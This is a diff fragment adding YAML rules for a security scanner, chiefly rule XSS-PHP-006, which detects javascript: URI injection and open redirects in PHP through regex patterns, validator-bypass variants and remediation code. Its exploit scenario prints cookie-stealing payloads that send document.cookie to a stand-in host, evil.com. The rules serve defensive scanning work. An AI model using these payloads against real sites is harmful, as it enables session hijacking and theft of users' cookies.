+    confidence_factors:
+      pattern_strength: high
+      context_match: high
+      proximity_to_user_input: high
+      sanitization_absence: high
+    metadata:
+      rule_version: '3.0.0'
+      last_reviewed: '2025-01-15'
+      rule_maturity_level: hardened
+      detection_complexity: contextual
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules: [XSS-PHP-001, XSS-PHP-003]
+
+  # --------------------------------------------------------------------------
+  # XSS-PHP-006: javascript: URI in PHP-Generated Links/Redirects
+  # --------------------------------------------------------------------------
+  - rule_id: XSS-PHP-006
+    title: javascript URI in PHP-Generated Links and Redirects
+    description: >
+      Detects PHP patterns where user-controlled data is used to construct URLs
+      for redirects (header Location), link href attributes, or iframe/object src
+      attributes without validating the URI scheme. This enables javascript: URI
+      injection, which executes arbitrary JavaScript when the link is clicked or
+      the redirect is followed.
+    language: php
+    category: xss
+    severity: High
+    confidence: 0.89
+    cwe: CWE-79
+    owasp: A03:2021-Injection
+    tags: [xss, javascript-uri, redirect, open-redirect, php]
+    detection_layer: 1
+    attack_surface_type: web
+    patterns:
+      - type: regex
+        pattern: 'header\s*\(\s*[''"]Location:\s*[''"].*?\.\s*\$_(?:GET|POST|REQUEST)\s*\['
+        description: "PHP redirect with user-controlled Location header"
+      - type: regex
+        pattern: 'header\s*\(\s*[''"]Location:\s*\$(?:url|redirect|next|return|callback|goto|target|dest)\b'
+        description: "PHP redirect header with user-controlled variable"
+      - type: regex
+        pattern: '<a\s+href\s*=\s*[''"]?\s*<\?(?:=|php\s+echo)\s+\$(?:_GET|_POST|_REQUEST|url|link|redirect)'
+        description: "Anchor href from user-controlled data without scheme validation"
+      - type: regex
+        pattern: '<iframe\s+src\s*=\s*[''"]?\s*<\?(?:=|php\s+echo)\s+\$(?:_GET|_POST|_REQUEST|url|src|embed)'
+        description: "Iframe src from user-controlled data"
+      - type: regex
+        pattern: 'echo\s+[''"]<a\s+href=\\\?[''"][''"].*?\.\s*\$(?:url|link|href|redirect|next)\b'
+        description: "PHP echo constructing link with user-controlled href"
+      - type: regex
+        pattern: '(?:redirect|Redirect)\s*\(\s*\$(?:_GET|_POST|_REQUEST)\s*\[\s*[''"](?:url|redirect|next|return|goto)[''"]'
+        description: "Framework redirect function with user-provided URL"
+    anti_patterns:
+      - 'parse_url'
+      - 'filter_var.*FILTER_VALIDATE_URL'
+      - 'strpos.*http'
+      - 'preg_match.*https?'
+      - 'esc_url'
+      - 'url()'
+      - 'route('
+      - 'allowedHosts'
+      - 'allowedDomains'
+      - 'whitelist'
+      - 'test'
+      - 'mock'
+      - 'phpunit'
+      - 'fixture'
+    bypass_variants:
+      - description: "URL validation bypassed with javascript: scheme"
+        pattern: 'filter_var\s*\(\s*\$\w+\s*,\s*FILTER_VALIDATE_URL\s*\)[\s\S]{0,100}header\s*\(\s*[''"]Location'
+      - description: "parse_url check bypassed with javascript://host"
+        pattern: 'parse_url\s*\(\s*\$\w+\s*,\s*PHP_URL_HOST\s*\)[\s\S]{0,100}(?!.*scheme)[\s\S]{0,100}header'
+      - description: "Open redirect via data: URI"
+        pattern: 'header\s*\(\s*[''"]Location:\s*data:text/html'
+    evasion_indicators:
+      - "URL validation checks host but not scheme"
+      - "filter_var FILTER_VALIDATE_URL accepts javascript: scheme"
+      - "URL whitelist bypassed with subdomain matching"
+      - "Redirect target from session/cookie (user-controllable)"
+    encoding_variants:
+      - type: "header_redirect"
+        pattern: 'header\s*\(\s*[''"]Location:.*\$(?:url|redirect|next)'
+      - type: "href_attribute"
+        pattern: 'href=.*\$(?:url|link|redirect)'
+      - type: "meta_refresh"
+        pattern: 'meta.*refresh.*url=.*\$\w+'
+    multi_function_chain_patterns:
+      - "$_GET['redirect'] -> header('Location: ' . $redirect) -> javascript: execution"
+      - "$url from DB -> <a href='$url'> -> javascript: link"
+      - "callback URL -> redirect() -> open redirect to phishing site"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "javascript: URI in redirects enables XSS and phishing"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "$_GET['redirect']"
+        sink: "header_Location"
+        through: "direct_concatenation"
+      - source: "$_GET['url']"
+        sink: "href_attribute"
+        through: "echo_statement"
+      - source: "database_url"
+        sink: "iframe_src"
+        through: "model_property"
+    impact: |
+      javascript: URI injection and open redirect enable:
+      - XSS via javascript: scheme in location headers
+      - Phishing via open redirect to attacker-controlled sites
+      - OAuth token theft via redirect URI manipulation
+      - Browser-level script execution from link clicks
+    remediation: |
+      ```php
+      // SECURE: Validate URL scheme before redirect
+      $url = $_GET['redirect'] ?? '/';
+      $parsed = parse_url($url);
+      $scheme = $parsed['scheme'] ?? '';
+      if (!in_array($scheme, ['http', 'https'], true)) {
+          $url = '/'; // Fallback to safe URL
+      }
+      // Also validate against allowed domains
+      header('Location: ' . $url);
+
+      // WordPress
+      wp_safe_redirect(wp_validate_redirect($url, home_url()));
+
+      // Laravel
+      return redirect()->to($url); // With url validation middleware
+      ```
+    references:
+      - "https://cwe.mitre.org/data/definitions/79.html"
+      - "https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html"
+    context_awareness:
+      surrounding_context_patterns: ['header', 'Location', 'redirect', 'href', 'src']
+      taint_source_indicators: ['$_GET', '$_POST', '$_REQUEST', '$url', '$redirect']
+      taint_sink_indicators: ['header.*Location', 'href=', 'src=', 'redirect(']
+      sanitization_patterns: ['parse_url.*scheme', 'esc_url', 'wp_safe_redirect', 'filter_var']
+    severity_scoring:
+      severity_weight: 8
+      risk_score_formula_hint: "severity_weight * confidence * (1 + redirect_exploitation)"
+      exploitability_score: High
+    exploit_scenario:
+      attack_example: |
+        PHP login redirect without scheme validation:
+        header('Location: ' . $_GET['next']);
+        URL: https://target.com/login?next=javascript:fetch('https://evil.com?c='+document.cookie)
+        After login, browser executes javascript: URI.
+      example_payload: "javascript:document.location='https://evil.com/steal?c='+document.cookie"
+      attacker_objective: "Inject javascript: URI via PHP redirect or link"
+    confidence_factors:
+      pattern_strength: high
+      context_match: high
+      proximity_to_user_input: high
+      sanitization_absence: high
+    metadata:
+      rule_version: '3.0.0'
+      last_reviewed: '2025-01-15'
+      rule_maturity_level: hardened
+      detection_complexity: contextual
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules: [XSS-PHP-001, XSS-PHP-002]
